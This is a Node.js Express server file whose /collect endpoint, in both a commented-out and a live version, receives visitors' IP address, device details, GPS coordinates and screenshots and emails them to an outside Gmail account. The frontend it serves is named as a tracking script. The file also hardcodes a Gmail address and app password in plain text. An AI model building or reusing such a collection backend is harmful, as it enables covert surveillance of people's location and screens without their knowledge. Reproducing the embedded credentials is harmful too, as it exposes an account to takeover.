// const express = require("express");
// const cors = require("cors");
// const nodemailer = require("nodemailer");
// const app = express();



// // Enable CORS for all origins
// app.use(
//     cors({
//       origin: "https://trackingscriptfront.vercel.app", // Replace with your frontend domain
//       methods: ["GET", "POST"], // Allow specific HTTP methods
//       allowedHeaders: ["Content-Type"] // Allow specific headers
//     })
//   );


// app.use(express.json());

// // Email configuration
// const transporter = nodemailer.createTransport({
//   service: "gmail",
//   auth: {
//     user: "olaniyanshamsudeenyinka001@gmail.com", // Replace with your Gmail
//     pass: "hhcf murv vxae angt" // Replace with your Gmail app password (not your actual password)
//   }
// });

// app.post("/collect", (req, res) => {
//   const deviceInfo = req.body;

//   // Compose the email
//   const mailOptions = {
//     from: "olaniyanshamsudeenyinka001@gmail.com",
//     to: "lalatechnigltd@gmail.com", // Replace with your Gmail
//     subject: "Device Info Collected",
//     text: `Device Information:
//     IP Address: ${deviceInfo.ip}
//     User Agent: ${deviceInfo.userAgent}
//     Platform: ${deviceInfo.platform}
//     Language: ${deviceInfo.language}`
//   };

//   // Send the email
//   transporter.sendMail(mailOptions, (err, info) => {
//     if (err) {
//       console.error("Error sending email:", err);
//       res.status(500).send("Failed to send email.");
//     } else {
//       console.log("Email sent:", info.response);
//       res.status(200).send("Device info received and emailed successfully.");
//     }
//   });
// });

// const PORT = 3000;
// app.listen(PORT, () => {
//   console.log(`Server running on http://localhost:${PORT}`);
// });





require("dotenv").config();
const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: "10mb" })); // Support large JSON data

// Configure Nodemailer Transporter
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "olaniyanshamsudeenyinka001@gmail.com", // Your Gmail address
        pass: "hhcf murv vxae angt", // App Password from Gmail
    },
});

app.post("/collect", async (req, res) => {
    try {
        const { userAgent, platform, language, screenSize, latitude, longitude, ip, screenshots } = req.body;

        // Compose Email
        const mailOptions = {
            from: "olaniyanshamsudeenyinka001@gmail.com",
            to: "lalatechnigltd@gmail.com", // Your Gmail
            subject: "Device Data & Screenshots",
            html: `
                <h2>Device Information</h2>
                <p><b>IP Address:</b> ${ip}</p>
                <p><b>User Agent:</b> ${userAgent}</p>
                <p><b>Platform:</b> ${platform}</p>
                <p><b>Language:</b> ${language}</p>
                <p><b>Screen Size:</b> ${screenSize}</p>
                <p><b>Location:</b> Latitude ${latitude}, Longitude ${longitude}</p>
                <h3>Screenshots:</h3>
                ${screenshots.map((img, index) => `<img src="${img}" alt="Screenshot ${index + 1}" width="300"/>`).join("<br/>")}
            `,
        };

        // Send Email
        await transporter.sendMail(mailOptions);

        res.json({ success: true, message: "Data sent to email!" });
    } catch (error) {
        console.error("Error sending email:", error);
        res.status(500).json({ success: false, message: "Error sending email." });
    }
});

// Start Server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
